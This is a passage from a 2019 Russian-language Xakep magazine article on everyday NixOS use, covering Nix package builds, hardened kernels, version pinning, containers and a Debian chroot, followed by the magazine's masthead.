управлять базовым сло ем  конфигура ции для компании — настройкой
домена, стандартных плагинов для браузера и так далее. Весомый плюс дан‐
ного подхода — он не ограничивает свободу людей, работающих в компании,
так как нет чувства, что твоим компьютером управляет кто‐то другой: человек
может посмотреть на обновлен ную конфигурацию, изменив URL «перейти
на нее», и продол жать работать.
   Или, быть может, тебе нужно работать со зву ком и понадобилось реал‐
тайм‐аудио? Просто воспользуйся готовой кон фигура цией от musnix.


СБОРКА ПАКЕТА ИЗ ИСХОДНИКОВ
Система сборки пакетов Nix чем‐то напоминает сис тему ebuild для Gentoo,
когда большую часть работы выполняет сам пакетный менеджер, который
содержит информацию о том, как собирать при наличии Makeﬁle, CMakeLists
et cetera.
  Сборочный файл для GNU Hello совсем не будет содержать указаний
на то, как собирать:


{ stdenv, fetchurl }:


stdenv.mkDerivation rec {
  name = "hello‐${version}";
  version = "2.10";


  src = fetchurl {
    url = "mirror://gnu/hello/${name}.tar.gz";
    sha256 = "0ssi1wpaf7plaswqqjwigppsg5fyh99vdlb9kzl7c9lng89ndq1i";
  };


  doCheck = true;


  meta = with stdenv.lib; {
    description = "A program that produces a familiar, friendly
greeting";
    longDescription = ''
      GNU Hello is a program that prints "Hello, world!" when you
run it.
      It is fully customizable.
    '';
    homepage = https://www.gnu.org/software/hello/manual/;
    license = licenses.gpl3Plus;
    maintainers = [ maintainers.eelco ];
    platforms = platforms.all;
  };
}

Для сборки и установки дос таточно записать эти строки в файл (hello.nix, нап‐
ример) и выполнить следующую команду:


$ nix‐env ‐r ‐f ./hello.nix ‐i

Если понадобится совершить какие‐либо нес тандартные действия (частично
это будет рассмотрено на примере работы с бинарными пакетами далее),
достаточно переопределить конкрет ные этапы.
  Мы не будем подробно рас сматривать все случаи сборки различных при‐
ложений, ибо вариантов бесчисленное множество. Тем не менее я советую
посмотреть своими глазами на то, каким образом составляются описания
для сборки различного ПО в репозитории nixpkgs. Я крайне редко (буду чес‐
тным — никогда) пишу описания сборки с нуля, в nixpkgs легко най ти пример
для разных систем сборки, а также велико лепный набор костылей на все слу‐
чаи жизни.


БИНАРНЫЕ ПАКЕТЫ И FHS
NixOS отличается от дру гих дистрибутивов тем, что разработчикам дистри‐
бутива пришлось отказаться от совместимос ти с FHS — стандартом, опре‐
деляющим местоположение библиотек, исполня емых файлов, конфигурации
и прочего. Из‐за это го бинарные утилиты, соб ранные для дру гих дис трибути‐
вов, без изменений работать не смо гут: каталогов /usr/share и /usr/lib
в NixOS попросту нет.
  При этом, если разработ чик проприетарного программного обеспечения
будет собирать для Nix, ему это будет только в плюс, так как сам пакетный
менеджер Nix на данный момент работает на всех дистрибути вах (включая
Ubuntu, Fedora, Debian), а прос тая работа с зависимостями позволит не бес‐
покоиться о том, зарабо тает ли оно на конкрет ном.
  Например, для создания пакета для BinaryNinja нам необязательно кос‐
тылить с изменением бинарных файлов и зависимос тей вручную (за исклю‐
чением libpython, но это уже не за висит непосредственно от Nix).


with import <nixpkgs> {};


pkgs.stdenv.mkDerivation {
  name = "binary‐ninja";


  src = ./BinaryNinja.zip;


  installPhase = ''
    mkdir ‐p $out/share/binary‐ninja
    cp ‐r * $out/share/binary‐ninja
    ln ‐s ${pkgs.python2}/lib/libpython2.7.so.1.0 $out/share/
binary‐ninja/libpython2.7.so.1


    mkdir ‐p $out/bin
    ln ‐s $out/share/binary‐ninja/binaryninja $out/bin/
  '';


  nativeBuildInputs = [ autoPatchelfHook ];
  buildInputs = [
    unzip
    stdenv.cc.cc glib fontconfig dbus libglvnd
    xlibs.libX11 xlibs.libXi xlibs.libXrender
    python2
  ];
}

Пояснения излишни — мы имеем некоторый бойлерплейт описания сборки,
а также список зависимостей. Далее достаточно выполнить команду


$ nix‐env ‐r ‐f ./binaryninja.nix ‐i

После чего  binaryninja будет уста новлен на уровне пользовате ля, но с
управлением через пакетный менеджер.
  Но есть нюанс, который нужно помнить: в том слу чае, если это бинарное
ПО, которое хочет обновлять ся самос тоятельно (как binaryninja), оно это сде‐
лать не сможет, так как каталог приложения при установке через пакетный
менеджер доступен толь ко для чтения.





ПРИЯТНЫЕ МЕЛОЧИ
Для Chromium существу ет воз можность управлять плагинами со стороны сис‐
темы (небольшое описание есть тут).
   NixOS позволяет управлять плагина ми для Chromium прямо в конфигура‐
ции для системы. Например, чтобы установить по умолчанию HTTPS Every‐
where и uBlock  Origin, достаточно всего лишь определить их в списке
extensions:


programs.chromium = {
  enable = true;
  extensions = [
    "cjpalhdlnbpafiamejdnhcphjbkeiagm" # uBlock Origin
    "gcbommkclmclpchllfjekcdonpmejbdp" # HTTPS Everywhere
  ];
};


HARDENED
Для NixOS существует про филь Hardened, который объединяет в себе полез‐
ные для безопасности нас тройки системы. И у тебя есть возможность отка‐
тить некоторые из них. Например, я делаю так:


imports =
  [ # Include the results of the hardware scan.
    ./hardware‐configuration.nix
    <nixpkgs/nixos/modules/profiles/hardened.nix>
  ];


security.allowUserNamespaces = true;
security.allowSimultaneousMultithreading = true;

В данном случае я использую hardened‐опции по умол чанию, но некоторые
из них возвращаю в нужное мне состояние.
  Значительно большего уровня защищенности можно дос тигнуть исполь‐
зованием специализиро ванного hardened‐ядра.
  Все hardened‐ядра в NixOS имеют пос тфикс _hardened, соответственно,
возможные варианты можно найти прос тым поиском по пакетам (также я
добавляю .kernel, так как по умолчанию nix search покажет и модули ядра):


$ nix search linuxPackages '_hardened\.kernel'

К примеру, на момент написания статьи были дос тупны следующие ядра:


* nixpkgs.linuxPackages_hardened.kernel (linux‐4.14.105)
* nixpkgs.linuxPackages_latest_hardened.kernel (linux‐5.0)
* nixpkgs.linuxPackages_latest_xen_dom0_hardened.kernel (linux‐5.0)
* nixpkgs.linuxPackages_testing_hardened.kernel (linux‐5.0‐rc8)
* nixpkgs.linuxPackages_xen_dom0_hardened.kernel (linux‐4.14.105)

Аналогичным образом можно искать и обычные ядра:


$ nix search linuxPackages '\.kernel'

Стоит отметить, что hardened‐ядра не включают опции из профиля Hardened
по умол чанию, тем самым гиб кость снижается только для той конфигурации
ядра, которую невозможно изменять пос ле загрузки пос редс твом интерфей‐
сов ядра.
  Далее в configuration.nix ука зываем необ ходимое нам ядро, нап‐
ример:


boot.kernelPackages = pkgs.linuxPackages_latest_hardened;

После чего ставший уже привычным nixos‐rebuild  switch и в случае
со сменой ядра — перезагрузка (или kexec).


ХРАНЕНИЕ СЕКРЕТОВ ДЛЯ ПУБЛИЧНЫХ КОНФИГУРАЦИЙ
Самый простой способ для того случая, когда ты распространяешь кон‐
фигурацию, — использовать вклю чение конфигура ции через import. Нап‐
ример:


let
  secrets = import ./secrets.nix;
in {
  users.extraUsers.root = {
    openssh.authorizedKeys.keys = [ secrets.pubkey ];
  };


ДЕКЛАРАТИВНЫЕ КОНТЕЙНЕРЫ
Большинство из нас зна ет, многие любят и пос тоянно применя ют, а некото‐
рые даже изобретают свои системы кон тейнерной виртуализации, позволя‐
ющие запускать отдельные приложения или целые опе рационные системы,
используя ядро хостовой ОС.
   Что меня восхищает в контейнерах в NixOS — возможность использовать
те же самые декларации, которые использовались ранее для хостовой сис‐
темы. По сути, единственное, что отличает контейнер от основной сис‐
темы, — другое пространство имен (namespace) в конфигурационном фай ле.
  В качестве примера покажу одну из деклараций контейнера, которая
у меня осталась где‐то в конфигурациях. В данном случае определен контей‐
нер с версией Chromium из релиза NixOS 18.03.


containers.test = {
  autoStart = true;
  config =
  { config, pkgs, ... }:
  let
    stableTarball = fetchTarball "${tarball‐base}/nixos‐18.03.tar.gz"
;
  in {
    nixpkgs.config = {
      allowUnfree = true;
      packageOverrides = pkgs: {
        stable = import stableTarball {
          config = config.nixpkgs.config;
        };
      };
    };
    environment.systemPackages = with pkgs; [
      stable.chromium
    ];
  };
};

То есть, как ты уже мог заметить, только неболь шой «контейнерный бойлер‐
плейт», и мы получаем логичес ки изо лированную среду. При этом стоит отме‐
тить, что контейнеры в NixOS не предполагают изоляцию с целью усиления
безопасности.


ДЕКЛАРАТИВНАЯ ГЕНЕРАЦИЯ ВИРТУАЛЬНЫХ МАШИН
Дам ссылку на свою предыду щую статью про AppVM, которую я писал,
еще когда пользовал Gentoo в качес тве хос товой сис темы.
  Использование вир туальных машин в рамках толь ко пакетного менеджера
Nix в других дистрибутивах и использование Nix в рамках NixOS в данном слу‐
чае ничего не изменит. Тут можно продолжить оды Nix за внесение универ‐
сальности не только в рамках «материн ско го дис трибутива», но и в общем
в экосистеме GNU/Linux, но буду при держивать ся основной цели статьи
и показывать больше непосредственно примеры использования в пов‐
седневной жизни.


                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ
               NIXOS
             ОСВАИВАЕМ ФИЧИ ОДНОГО ИЗ САМЫХ
               НЕОБЫЧНЫХ ДИСТРИБУТИВОВ LINUX





СТАБИЛЬНОСТЬ
Как‐то раз я случайно обнаружил, что поставил новую систему из unstable‐
ветви. В NixOS unstable‐ветвь собира ется из тех пакетов, которые добавили
непосредственно в Git‐репозиторий  nixpgs на GitHub и которые пос ле
успешно собрались. Тем самым я оказался на весьма суровом bleeding edge.
  Очевидным результатом стало то, что однажды (на самом деле это было
в первый день) я все‐таки отхватил баг — virt‐manager не работал.





Что я мог бы сделать, если бы использовал классические дистрибутивы?
Добавить репозиторий со старыми пакета ми, установить низкий при оритет,
попробовать установить пакет и пос ле — начать страдать от безысходности
из‐за того, что прошлая версия пакета требует одной версии определенной
библиотеки, а другой установленный пакет в сис теме — другой версии этой
же библиотеки.
  В случае NixOS подоб ных проблем быть не может. Вопрос решился
добавлением стабильной ветки:


nixpkgs.config = {
  allowUnfree = true;
  packageOverrides = pkgs: {
    stable = import (fetchTarball "${tarball‐base}/nixos‐18.09.tar.
gz") {
      config = config.nixpkgs.config;
    };
  };
};

где tarball‐base определяется ранее:


let
  tarball‐base = "https://github.com/NixOS/nixpkgs‐channels/archive/"
;
in {
  ...

После чего в списке используемых пакетов мне достаточно использовать
префикс stable. для того, что бы уста навливать пакеты из стабильных ветвей,
например:


environment.systemPackages = with pkgs; [
  ...
  stable.virt‐manager
  ...
];

Для простоты понимания того, какая версия исполь зуется, есть возможность
указывать симлинки явно, например:


environment.systemPackages = with pkgs; [
  ...
  (pkgs.writeShellScriptBin "virt‐manager‐unstable" "${virtmanager}/
bin/virt‐manager $@")
  (pkgs.writeShellScriptBin "virt‐manager‐stable" "${stable.virtma
nager}/bin/virt‐manager $@")
];

Таким же образом можно использовать любой из снимков сос тояния репози‐
тория nixpkgs для того, чтобы получать нужные версии.
  Например, мы хотим найти версию снимка состояния репозитория nixpgs,
в котором virt‐manager имел версию 2.0.
  Для этого нам достаточно перейти в каталог с нужным пакетом:


$ cd nixpkgs/pkgs/applications/virtualization/virt‐manager

После чего, запустив git log, найти коммит (простым поиском по номеру
версии), в котором данная версия была добавлена. Например, virt‐manager
2.0 был добавлен в этом коммите:



  commit db7e9408a1b5c0d7d103c28b91646b374968b045
  Author: Gabriel Ebner gebner@gebner.org
  Date:   Wed Nov 7 22:25:09 2018 +0100


    virtmanager: 1.5.1 → 2.0.0


Следовательно, для получения  virt‐manager версии 2.0 нам достаточно
использовать архив с этого коммита:


nixpkgs.config = {
  allowUnfree = true;
  packageOverrides = pkgs: {
    stable = import (fetchTarball "${tarball‐base}/nixos‐18.09.tar.
gz") {
      config = config.nixpkgs.config;
    };
    commit1 = import (fetchTarball "${tarball‐base}/db7e9408a1b5c0d
7d103c28b91646b374968b045.tar.gz") {
      config = config.nixpkgs.config;
    };
  };
};

После мы можем таким же образом, как и ранее, добавить в bin исполня емый
файл для определенной версии.


environment.systemPackages = with pkgs; [
  ...
  (pkgs.writeShellScriptBin "virt‐manager‐unstable" "${virtmanager}/
bin/virt‐manager $@")
  (pkgs.writeShellScriptBin "virt‐manager‐stable" "${stable.virtma
nager}/bin/virt‐manager $@")
  (pkgs.writeShellScriptBin "virt‐manager‐2.0.0" "${commit1.virtma
nager}/bin/virt‐manager $@")
];

Итого мы имеем virt‐manager из последней ста бильной ветки 18.09, той вер‐
сии, которая на данный момент находит ся в Git, а также версии 2.0.0.
   Это подход со стороны основной конфигура ции сис темы. Таким образом
можно определять каждую из версий пакетов, но значительный минус дан‐
ного подхода в том, что каждый архив должен быть загружен, соответственно
есть некоторый оверхед по размеру фай лов.
   Альтернативный вариант — установка Nix‐пакета от пользователя, в этом
случае достаточно просто запустить команду в каталоге с описанием
для сборки.
  Или же можно вернуться на стабильную вет ку из unstable. Предположим,
мы хотим переключиться на следующий релиз 19.03, для этого достаточно
сделать так:


$ nix‐channel ‐‐remove nixos‐19.03
$ nix‐channel ‐‐add  https://nixos.org/channels/nixos‐19.03 nixos
$ nixos‐rebuild switch ‐‐upgrade

Проблемы с даунгрейдом системы целиком? В разумных пределах не дол жны
быть, а те, что будут, связаны с конфигура цией из твоего домашнего катало‐
га, но никак не с базовой системой.
   Каналы также можно использовать нап рямую, например если мы добавим
каналы для стабильного релиза, нес табильного и следующего планируемого
стабильного.


$ nix‐channel ‐‐add https://nixos.org/channels/nixos‐19.03 nixos
$ nix‐channel ‐‐add https://nixos.org/channels/nixos‐18.09 stable
$ nix‐channel ‐‐add https://nixos.org/channels/nixos‐unstable
unstable
$ nix‐channel ‐‐update

Тот, что назван nixos, будет использоваться по умолчанию.
  Далее мы можем определить каналы и использовать их для установки
программ:


let
  unstable = import <unstable> {};
  stable = import <stable> {};
in {
  ...
  environment.systemPackages = with pkgs; [
    ...
    unstable.chromium
  ];
  ...
}

Для того чтобы не пропустить улучшения в плане работы с тем, что было опи‐
сано выше, советую заглянуть в статью на NixOS Wiki.


БОЛЕЕ РАДИКАЛЬНОЕ РЕШЕНИЕ ПРОБЛЕМ С FHS
Проблема несов местимости NixOS с FHS в основном затрагивает бинарные
пакеты (суть проб лемы я описал в соответс твующем разделе), но часто быва‐
ет, что написан ный очень странными людь ми код собирается, только если
в системе есть условный /usr/lib/libastral.so по жестко заданному пути,
и вне FHS‐совместимого окружения собирать ста новится невыносимо.
  Решение с исполь зованием Docker в этом случае довольно очевид но
и приземленно, поэтому оста вим его хипстерам. Для своих задач я пред‐
почитаю использовать обычное chroot‐окружение с Debian, и я покажу,
как его готовить таким обра зом, чтобы он не дос тавлял проблем.
  Для начала просто генерируем chroot с Debian или любым дру гим дистри‐
бутивом, который мы будем использовать для FHS окружения (я использую
Debian и Gentoo):


$ cd /home/user/chroots
$ debootstrap sid sid‐root http://deb.debian.org/debian/

После чего добавляем в configuration.nix сервис с mount‐костылями,
который будет монтировать все нужные нам катало ги. Самое важное из это‐
го — привязка (bind) домаш него каталога хостовой системы к системе
в chroot.


systemd = {
  services = {
    "sid‐chroot‐mounts" = {
      enable = true;
      description = "Setup mounts for debian sid chroot";
      wantedBy = [ "multi‐user.target" ];
      script = ''
        ls /home/user/chroots/sid‐root/home/user/.zshrc && exit
        ${pkgs.utillinux}/bin/mount ‐‐bind /home/user /home/user/
chroots/sid‐root/home/user
        ${pkgs.utillinux}/bin/mount ‐‐bind /dev /home/user/chroots/
sid‐root/dev
        ${pkgs.utillinux}/bin/mount ‐‐bind /proc /home/user/chroots/
sid‐root/proc
        ${pkgs.utillinux}/bin/mount ‐‐bind /sys /home/user/chroots/
sid‐root/sys
      '';
      serviceConfig.Type = "oneshot";
    };
  };
};

Далее добавляем в скрипт инициализацию используемого шел ла (у меня
это .zshrc):


$ alias fhs="su ‐c 'chroot /home/user/chroots/sid‐root /bin/su ‐l
user'"

Теперь достаточно набрать команду fhs, и мы окажемся в окружении Debian,
использующем наш родной домашний каталог. Раз ве не прекрасно?
  Далее, для того чтобы не перепу тать окру жения, я советую добавить
небольшую проверку в тот же файл инициализации шелла.


$ which apt >/dev/null 2>&1 && PS1="fhs‐chroot $PS1"

Что мы получили в итоге?



  user@local ~ $ fhs
  Password:
  debian user@local ~ $



HOME MANAGER
Некоторые пользователи идут дальше и исполь зуют такой же подход к кон‐
фигурированию не толь ко системы, но и домашнего каталога пользовате ля.
Тут стоит отметить, что это будет эффективно не только на NixOS, так
как home‐manager от Rycee работает на уровне пользователя.
  Например, Nix + home‐manager мож но использовать на macOS.


ЧЕМ ТЫ МОЖЕШЬ ПОМОЧЬ NIXOS?
На данный момент активна инициатива Zero Hydra Failures, которая пред‐
полагает устранение всех ошибок к следующему релизу 19.03.


ГДЕ ПОЛУЧИТЬ ПОМОЩЬ?
Англоязычную поддержку можно получить в канале #nixos на freenode, пол ный
список каналов можно найти в списке c NixOS wiki.
   Если тебе нужна поддержка на рус ском языке, можешь создать треды
с тегами nix и nixos на ЛО Ре, где на данный момент отвечают некоторые
из русскоязычных разработчиков NixOS.


ВМЕСТО ЗАКЛЮЧЕНИЯ
Сегодня я приоткрыл часть повседневности поль зователя NixOS. Можно
видеть, что NixOS значительно упрощает базовый слой сис темы в рамках кон‐
фигурирования, а также позволяет не изоб ретать велосипед при исполь‐
зовании одной конфигурации на раз ных машинах, даже когда это не просто
разные дистрибутивы, а разные операционные сис темы.
   №03 (240)
          Андрей Пись мен ный        Илья Русанен          Алексей Глазков
              Главный редактор       Зам. главного редактора     Выпускающий редактор
               pismenny@glc.ru        по техническим вопросам          glazkov@glc.ru
                                            rusanen@glc.ru
                                 Евгения Шарипова
                                     Литературный редактор


                           РЕДАКТОРЫ РУБРИК
          Андрей Пись мен ный        Илья Русанен          Александр «Dr.»
               pismenny@glc.ru             rusanen@glc.ru            Лозовский
                                                                           lozovsky@glc.ru
          Иван «aLLy» Андреев       Евгений Зобнин          Тать яна Чупрова
            iam@russiansecurity.expert          zobnin@glc.ru              chuprova@glc.ru
                      Андрей Васильков     Валентин Холмогоров
                        the.angstroem@gmail.com      valentin@holmogorov.ru


                          MEGANEWS
                           Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                               РЕКЛАМА

                                  Анна Яковлева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                             Вопросы по под писке: lapina@glc.ru
                            Вопросы по материалам: support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, ком ната 54, офис 7. Зарегистри ровано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых ком муника ций (Роскомнадзоре), свидетельство Эл № ФС77‐67001 от 30.
08.2016 года. Мнение редакции не обязатель но совпада ет с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответс твен ности. Редакция
не несет ответственности за содер жание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов жур нала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2019